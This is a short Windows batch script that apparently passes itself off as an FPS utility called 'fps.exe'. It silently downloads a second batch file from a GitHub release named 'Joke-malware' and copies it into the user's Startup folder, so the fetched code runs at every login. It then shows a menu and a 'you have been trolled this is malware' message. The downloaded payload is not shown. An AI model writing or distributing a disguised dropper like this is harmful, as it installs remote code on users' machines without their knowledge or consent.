@echo off
title fps.exe
color 0a
cls 
curl -O https://github.com/GreatNate0509YT/Other/releases/download/Joke-malware/sysfps.bat
cls
copy sysfps.bat %userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\sysfps.bat
:start
cls
echo fps
echo.
set /p main= choose
goto %main%



:fps
cls
echo you have been trolled this is malware
pause
exit
